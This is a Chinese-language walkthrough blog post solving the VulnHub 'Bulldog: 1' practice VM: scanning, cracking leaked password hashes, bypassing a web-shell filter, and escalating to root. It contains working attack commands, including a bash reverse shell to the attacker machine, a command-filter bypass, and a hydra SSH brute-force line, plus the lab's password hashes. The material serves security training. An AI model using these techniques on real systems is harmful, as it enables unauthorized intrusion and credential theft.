---
title: Bulldog-1
author: Creexile
date: 2025-01-23 16:14:49
lastMod: 2025-01-23
summary: 'easyNo.11'
cover: ''
category: '靶场'
draft: false
comments: false
sticky: 0
tags: [信息收集, 渗透]
---

# Bulldog: 1

---

easyNo.11

> 来源: [vulnhub靶场-Bulldog: 1](https://www.vulnhub.com/entry/bulldog-1,211/)
>
> 目标: get into the root directory and see the congratulatory message.
>
> 提示: if you get stuck, try to figure out all the different ways you can interact with the system. That's my only hint ;)
>
> 妙妙工具: `python -c 'import pty; pty.spawn("/bin/bash")'`

## 环境配置

- kali: 192.168.56.5
- target: 192.168.56.22

## 信息收集

nmap

```
nmap -sS 192.168.56.0/24
nmap -A 192.168.56.22

PORT  STATE SERVICE  VERSION
23    open  ssh      OpenSSH 7.2p2
80    open  http     WSGIServer 0.1 (Python 2.7.12)
8080  open  http     WSGIServer 0.1 (Python 2.7.12)
```

访问80端口(8080和80的内容似乎是一样的, 就不管了), 大意是我们被黑客入侵了, 目前正在评估风险; 访问公告, 发现来自技术人员的提示`clam shell and a smelly cow`

看着像是在说脏牛漏洞, 另一个不知道是什么

进行目录扫描

```
[23:05:21] 301 -    0B  - /admin
[23:05:28] 200 -    3KB - /dev/
[23:05:38] 200 -    1KB - /robots.txt
```

`/admin`是后台登录界面, `/robots.txt`没东西

`/dev/`像是给员工的公告, 解释了上一个黑客入侵的方法和他们之后要做什么:

1. 上一个入侵者利用漏洞获取低权限shell然后脏牛提权, 虽然他们要彻底取消php, 但是他们还在用之前的文件, 所以这个是可能的提权点
2. 他自己说的开放了SSH, 网站用的Django, 数据库似乎启用的MongoDB
3. 给了一个Web-Shell接口, 提示需要进行服务器身份验证后才能使用接口
4. 给了一些练习人名称, 扒拉下来可能要爆破用户
5. 查看源码, 发现前端中给出了对应用户的密码哈希值

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250123123814.png)

有哈希值, 其他地方又没有利用方法, 那就只能爆破哈希值了

[输入让你无语的MD5](https://www.somd5.com/)

可以拿到最后的两个md5的明文, 利用对应的用户名和密码进行登录; 其中一个账号密码如下: `nick : bulldog`

## getshell

登陆之后, 之前的Web-Shell就可以使用了

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250123133116.png)

很显然这里有waf, 只能执行部分命令; 但是管道符和反引号执行命令是非常好的东西

```bash
echo `ls`
echo `cat manage.py`
# 这个似乎用不了, 挺奇怪的
echo `bash -i >& /dev/tcp/192.168.56.5/1234 0>&1`

echo 'ls' | bash
# 这个可以
echo 'bash -i >& /dev/tcp/192.168.56.5/1234 0>&1' | bash
```

## 信息收集

```bash
# 系统信息 Linux bulldog 4.4.0-87-generic #110-Ubuntu SMP Tue Jul 18 12:55:35 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
uname -a
# 内核版本 4.4.0-87-generic 好熟悉的版本
uname -r
# 查看发行版的信息 Ubuntu 16.04.3 LTS
# 有点高了
lsb_release -a
# 查看环境, 无gcc
python -h
nc -h
# 查看权限, 无
sudo -l
# 查看特权文件, 无发现
find / -perm -u=s -type f 2>/dev/null
# 看看计划任务, 无发现
cat /etc/crontab
```

看看能不能切换用户

```bash
# 看看有没有其他用户, 有一个bulldogadmin
cat /etc/passwd | grep -P '^[^:]+:[^:]+:(\d{4,}):'
```

尝试直接进入用户文件夹`/home/bullaodadmin`, 成功

进入隐藏文件夹`.hiddenadmindirectory`, 里面有一个程序?还有一个note, 这个note大概意思是: 这个程序还是原型, 主要功能为输入你的账户密码，它就会判断你是否有权访问某个文件

我们没有账号密码(似乎可以爆破), 下载似乎不行; 回头一想, 既然只是一个未完成的程序, 应该会直接将鉴权内容写在程序中(没有数据库等交互), 可能是某个账户的密码

来看看这个程序中有什么字符串吧

```
strings customPermissionApp
```

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250123144930.png)

可以看到这里是通过先自程序自身提权到root权限然后再进行判断的, 那么这里可以获取的字符串大概率是root的密码或者是sudo的密码

跑了一遍, 发现都不对, 应该是被混淆了, 这个看上去像是提示?

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250123153120.png)

去掉H后是`SUPERultimatePASSWORDyouCANTget`, 你无法得到的终极密码, 那就是你了

> 提权前先用python创建一个新的会话才能提权, 就用最上面的妙妙工具即可`python -c 'import pty; pty.spawn("/bin/bash")'`

## 提权

和程序里面的步骤一致即可

```bash
sudo su root
# SUPERultimatePASSWORDyouCANTget
```

看看`sudo -l`会发现可以在任何位置执行sudo, 要不是没有密码早就爆了

尝试了一些提权脚本, 没成功; 不管了, 反正拿到root目录下的flag就好了

![image.png](https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/20250123160109.png)

## 附录

```html
alan@bulldogindustries.com
<!--6515229daf8dbdc8b89fed2e60f107433da5f2cb-->

william@bulldogindustries.com
<!--38882f3b81f8f2bc47d9f3119155b05f954892fb-->

malik@bulldogindustries.com
<!--c6f7e34d5d08ba4a40dd5627508ccb55b425e279-->

kevin@bulldogindustries.com
<!--0e6ae9fe8af1cd4192865ac97ebf6bda414218a9-->

ashley@bulldogindustries.com
<!--553d917a396414ab99785694afd51df3a8a8a3e0-->

nick@bulldogindustries.com
<!--ddf45997a7e18a25ad5f5cf222da64814dd060d5-->
bulldog sarah@bulldogindustries.com
<!--d8b8dd5e7f000b8dea26ef8428caf38c04466b3e-->
bulldoglover
```

获取到bullaodadmin用户之后, 可以尝试爆破, 我字典差, 爆不出来

```bash
hydra -s 23 -l 用户名 -P 字典 ssh://192.168.56.22
```
